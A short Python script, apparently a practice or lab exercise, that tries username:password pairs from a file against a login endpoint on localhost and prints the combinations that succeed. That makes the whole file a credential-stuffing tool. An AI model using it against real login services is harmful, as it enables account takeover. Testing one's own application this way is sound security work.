import requests


def main():
    with open('accounts.txt', 'r') as f:
        for line in f:
            combo = line.strip('\r\n').split(':')
            username = combo[0]
            password = combo[1]

            params = {
                'username': username,
                'password': password,
            }
            response = requests.get(
                'http://localhost:5000/login', params=params)
            if response.content == 'SUCCESS':
                print response.content, ' --> ', username, ':', password

    # If we're running in stand alone mode, run the application
if __name__ == '__main__':
    main()
